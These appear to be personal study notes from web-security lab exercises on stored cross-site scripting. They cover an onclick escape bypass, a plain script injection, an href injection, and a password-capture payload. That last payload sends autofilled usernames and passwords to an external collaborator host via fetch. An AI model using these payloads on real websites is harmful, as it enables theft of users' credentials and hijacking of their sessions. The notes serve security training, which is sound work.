# Stored XSS

Take in and store somewhere that can lead to vulnerable for others user, website itself…

## LAB 00: ****Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

Real case: [https://www.websecuritylens.org/using-html-entity-encode-to-mitigate-xss-vulnerability-then-double-check-it/](https://www.websecuritylens.org/using-html-entity-encode-to-mitigate-xss-vulnerability-then-double-check-it/)

### Overall

The blog is comment enabled on each post. And when you fill in the full information include your comment, name, email & personal website, the website will combine with your name to make up a clickable name that link to your personal website. And the technique is perform some JS code.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled.png)

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%201.png)

So, in this case, seem only this snippet of code may cause harm to the blog. We try to inject some special characters to test out the function. We may noted that when testing with [ /\'"<>${}- ] , the blog escape ' with back dash  & encode < > “, the rest [ $ { } - ` / ] is not encoded or escape. This may be a hint for use to craft a payload that cause XSS.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%202.png)

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%203.png)

### Step to reproduce

At this point, we can see the picture below that these are what we can use without encode or escape. So, the point is to inject some JS code that cause the XSS happen in the blog.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%204.png)

Testing the theory in the native environment, we may noted that when combining ‘- together, we can escape the single quote pairs that boundary inside the tracker.track() method, which is a sink to the vulnerable in this case.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%205.png)

This make our payload, which is [ ‘-alert(1)-’ ] appear outside the single quote boundary the whole website parameter we need to input in this case context. Which then lead to the execute of the JS that cause XSS to happen.

But the problem is that we noted that ‘ is escaped by the back dash above, so we need to conduct a way to bypass this escape method to successful make this payload valid.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%206.png)

Then, the first thing we may want to give a shoot is encode what is being escaped using Burp’s decoder, trying some encode that make sense and find out the correct 1 is to html encode the single quote character and recraft the payload.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%207.png)

PAYLOAD: 

```bash
http:&#x27;-alert(1)-&#x27;
```

Reloading the blog, the payload will immediately trigger the XSS payload at loading screen.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%208.png)

### Mitigate

[Output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding)

[Sanitize with purifier](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)

### Appendix

[https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#introduction](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#introduction)

New way to approach: 

[https://medium.com/@adonkidz7/bypass-xss-filter-using-html-escape-f2e06bebc8c3](https://medium.com/@adonkidz7/bypass-xss-filter-using-html-escape-f2e06bebc8c3)

bypass: 

[https://www.cardinaleconcepts.com/exploit-xss-bypass-htmlencode/](https://www.cardinaleconcepts.com/exploit-xss-bypass-htmlencode/)

## LAB 01: ****Stored XSS into HTML context with nothing encoded****

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%209.png)

Escape the p tag, html tag injected being executed

PAYLOAD: 

```jsx
<script>prompt(”hello”);</script>
```

## ****LAB 02: Exploiting cross-site scripting to capture passwords****

DEMO: [https://xss-autofill.web.app/](https://xss-autofill.web.app/)

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%2010.png)

Allow inject html tag and execute directly on the page

—> Need to inject tags that accept username + password when user visit the page, because of autofill function automatically run and fill in the malicious field, it will use event onchange to track on the field, if the value length diff than the default 1, it will directly sent the content to attackers’ server. 

PAYLOAD:

```jsx
<input name=username id=username> //stored username
<input type=password name=password onchange="if(this.value.length)fetch('[https://svrldo6qew776jpux8o63t5pzg58tzho.oastify.com](https://svrldo6qew776jpux8o63t5pzg58tzho.oastify.com/)',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"> // check if 2 fields have diff value than default then fetch 
to the attacker website and send information
```

## LAB 03: **Stored XSS into anchor `href` attribute with double quotes HTML-encoded**

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%2011.png)

Post package with full information, website will store as a link in a tag which is name of the comment’s author, and they take it in raw format so we can inject some kind of malicious code lead to XSS like JS pseudo-protocol code.

![Untitled](Stored%20XSS%20b587f28661134e6b998c3e3dd4dab71f/Untitled%2012.png)

Inject in the website field via repeater. So, whenever someone trigger the author name will pop up an XSS.